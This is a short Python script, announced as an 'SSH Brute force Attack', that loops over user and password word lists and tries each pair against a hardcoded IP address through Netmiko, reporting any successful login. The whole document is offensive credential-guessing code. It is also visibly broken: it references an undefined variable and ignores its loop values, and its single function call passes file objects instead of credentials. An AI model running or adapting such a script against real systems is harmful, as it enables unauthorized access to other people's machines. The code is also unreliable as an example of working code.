#!/usr/bin/python

from netmiko import Netmiko

wordlist = "word.txt"
userlist = "user.txt"
IP = "11.11.11.171"
verbose="no"
user = "user"


print("SSH Brute force Attack")
print("Target:", IP )

def func_sshbrute(_user,_pass):
    try:
        sshconn = Netmiko(ip, username=str(user), password=str(_pass),device_type="linux")
        print("[+] BINGO - username: ", user, "Password: ", _pass)
        sshconn.disconnect()
    
    except:
        if verbose == "yes":
            print("[-] FAIL - Username: ", user, "Password", _pass)

with open (userlist,"r") as userlist:
    for _line in userlist:
        _user = _line.strip("\n")

        with open(wordlist,'r') as _wordlist:
            for _line in _wordlist:
                _pass = _line.strip("\n")

func_sshbrute(userlist,wordlist)
